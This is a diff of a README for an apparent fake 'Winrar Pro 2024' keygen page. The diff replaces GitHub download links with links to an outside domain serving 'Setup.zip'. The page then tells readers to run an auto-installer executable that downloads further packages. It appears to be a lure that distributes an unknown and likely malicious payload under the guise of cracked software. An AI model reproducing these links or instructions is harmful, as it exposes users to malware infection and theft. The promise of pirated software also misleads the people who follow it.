@@ -13,11 +13,11 @@ Tags: Winrar Pro 2024 free. Download Winrar Pro 2024 for free. Download free Win
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/89add1a8-05c7-44bf-a56e-c05d5d785af0)
-](https://github.com/DevSerena/Winrar-Keygen-2024/releases/download/V6.6/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/DevSerena/Winrar-Keygen-2024/releases/download/V6.6/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 
